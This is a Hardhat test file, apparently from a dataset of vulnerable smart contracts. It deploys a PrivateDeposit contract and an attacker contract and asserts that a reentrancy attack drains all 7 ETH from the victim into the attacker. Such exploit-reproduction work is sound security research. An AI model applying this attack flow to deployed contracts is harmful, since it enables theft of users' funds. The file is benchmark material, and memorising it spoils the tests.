const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol", function () {
  let PrivateDeposit;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol:Log");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy PrivateDeposit contract with Log address
    PrivateDeposit = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol:PrivateDeposit");
    victim = await PrivateDeposit.deploy();
    await victim.waitForDeployment();
    await victim.setLog(log.target); // Set Log address after deployment

    // Deploy hacker with victim address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });
    // verify correct deposit
    const initialBalance = await ethers.provider.getBalance(victim.target);
    expect(initialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from hacker on victim contract
    await hacker.deposit({value:  ethers.parseEther("2")});

    const privateBalanceAfterMaliciousDeposit = await ethers.provider.getBalance(victim.target);
    expect(privateBalanceAfterMaliciousDeposit).to.equal(ethers.parseEther("7")); 

    // we set the hackers balance to 0
    await network.provider.send("hardhat_setBalance", [
      hacker.target,
      "0x0",
    ]);
    let hackerBalanceBeforeAttack = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalanceBeforeAttack).to.equal(0);



    // Perform reentrancy attack through hacker
    await hacker.attack(ethers.parseEther("2"));

    // Verify the attack was successful

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(victim.target);
    const hackerBalance = await ethers.provider.getBalance(hacker.target);
    
    // victim has a drained account
    expect(personalBankBalance).to.equal(ethers.parseEther("0")); 

    //hacker has the balance:  5 original balance + 2 from hacker's initial deposit 
    expect(hackerBalance).to.equal(ethers.parseEther("7"));
  });
});